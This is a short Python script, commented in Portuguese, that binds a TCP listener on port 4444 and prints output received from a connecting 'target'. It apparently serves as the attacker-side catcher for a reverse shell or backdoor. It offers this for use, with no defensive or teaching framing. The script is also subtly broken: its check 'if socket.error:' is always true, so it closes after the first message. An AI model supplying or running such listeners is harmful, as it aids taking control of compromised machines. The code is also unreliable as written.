import socket

# Cria o socket e abre uma porta (4444) para se comunicar com o alvo
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 4444))
s.listen(1)
print('[+] Aguardando conexão...')
c, addr = s.accept()
print(f'[+] Conexão aceita de {addr}\n{"SAÍDA DE TEXTO DO ALVO:":^5}\n')
while True:
    print(c.recv(1024))
    if socket.error:
        print('[+] Conexão encerrada! \n[+] Pressione Enter para fechar o listener.')
        input()
        exit()
